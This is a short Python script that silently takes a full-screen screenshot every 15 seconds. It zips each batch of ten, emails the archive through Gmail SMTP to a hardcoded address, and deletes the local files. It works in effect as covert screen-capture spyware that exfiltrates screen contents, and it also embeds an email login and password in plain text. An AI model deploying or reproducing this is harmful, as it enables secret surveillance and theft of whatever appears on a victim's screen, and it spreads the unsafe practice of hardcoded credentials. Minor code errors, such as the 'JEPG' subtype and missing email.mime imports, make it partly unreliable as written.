import time
import sys
from PIL import Image
from PIL import ImageGrab 

# email related imports
import smtplib
import mimetypes
import email
import email.mime.application
import zipfile
import os

#default variables
runState = True;
fromaddr = 'abc@gmail.com';
username = 'sanchay.shukla@techvalens.com';
password = 'abcd1234';
toaddrs  = 'sanchay.shukla@techvalens.com';
files = [];

# Captures the screen 
def captureScreen():
	global files
	timestr = time.strftime("%Y%m%d-%H%M%S");
	ImageGrab.grab().save(timestr+'.jpg', "JPEG");
	files.append(timestr+'.jpg')
	return


def ZipfileAndSendEmail():
	global files
	timestr = time.strftime("%Y%m%d-%H%M%S");
	zipfilename = timestr+".zip";
	z = zipfile.ZipFile(zipfilename, "a");
	for file in files: 
		z.write(file);
		os.remove(file);
	z.close();
	files = []
	sendEmailWithAttachment(zipfilename);
	return

def sendEmailWithAttachment(filename):
	# Create a text/plain message
	msg = email.mime.Multipart.MIMEMultipart()
	msg['Subject'] = 'Screen Captured'
	msg['From'] = fromaddr
	msg['To'] = toaddrs

	# The main body is just another attachment
	body = email.mime.Text.MIMEText("")
	msg.attach(body)

	# PDF attachment
	fp=open(filename,'rb')
	att = email.mime.application.MIMEApplication(fp.read(),_subtype="JEPG")
	fp.close()
	att.add_header('Content-Disposition','attachment',filename=filename)
	msg.attach(att)

	# send via Gmail server
	# NOTE: my ISP, Centurylink, seems to be automatically rewriting
	# port 25 packets to be port 587 and it is trashing port 587 packets.
	# So, I use the default port 25, but I authenticate. 
	s = smtplib.SMTP('smtp.gmail.com')
	s.starttls()
	s.login(username,password)
	s.sendmail(fromaddr,toaddrs, msg.as_string())
	s.quit()
	os.remove(filename);
	return
	
# start
def start():
	sendZipFlag = 0;
	while(runState):
		time.sleep(15);
		captureScreen();
		sendZipFlag += 1;
		if sendZipFlag == 10:
			ZipfileAndSendEmail();
			sendZipFlag = 0;
	return

start();


